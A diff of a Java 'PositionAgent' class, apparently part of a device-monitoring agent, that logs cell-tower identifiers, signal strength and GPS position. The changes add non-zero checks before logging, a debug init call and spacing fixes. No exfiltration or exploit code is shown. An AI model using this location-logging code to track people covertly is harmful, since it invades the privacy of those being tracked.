@@ -268,12 +268,14 @@ public final class PositionAgent extends Agent {
 			debug.info(mb.toString());
 			//#endif
 
-			byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
+			if (mcc != 0) {
+				byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
 
-			logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
-					LogType.LOCATION_NEW);
-			saveLog(logCell, payload, LOG_TYPE_GSM);
-			logCell.close();
+				logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
+						LogType.LOCATION_NEW);
+				saveLog(logCell, payload, LOG_TYPE_GSM);
+				logCell.close();
+			}
 
 		} else {
 			final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
@@ -296,18 +298,20 @@ public final class PositionAgent extends Agent {
 			debug.info(mb.toString());
 			//#endif
 
-			byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
-			logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA),
-					LogType.LOCATION_NEW);
-			saveLog(logCell, payload, LOG_TYPE_CDMA);
-			logCell.close();
+			if (sid != 0) {
+				byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
+				logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA),
+						LogType.LOCATION_NEW);
+				saveLog(logCell, payload, LOG_TYPE_CDMA);
+				logCell.close();
+			}
 		}
 
 	}
 
 	boolean waitingForPoint = false;
 
-	private  void locationGPS() {
+	private void locationGPS() {
 		if (lp == null) {
 			//#ifdef DEBUG_ERROR
 			debug.error("GPS Not Supported on Device");
@@ -324,16 +328,18 @@ public final class PositionAgent extends Agent {
 
 		Runnable closure = new Runnable() {
 			public void run() {
-
+				//#ifdef DEBUG
+				debug.init();
+				//#endif
 				try {
-					waitingForPoint=true;
+					waitingForPoint = true;
 					if (lp.getState() == LocationProvider.AVAILABLE) {
 						//#ifdef DEBUG_TRACE
 						debug.trace("getLocation");
 						//#endif
 						loc = lp.getLocation(Conf.GPS_TIMEOUT);
 					}
-					waitingForPoint=false;
+					waitingForPoint = false;
 				} catch (LocationException e) {
 					//#ifdef DEBUG_ERROR
 					debug.error(e);
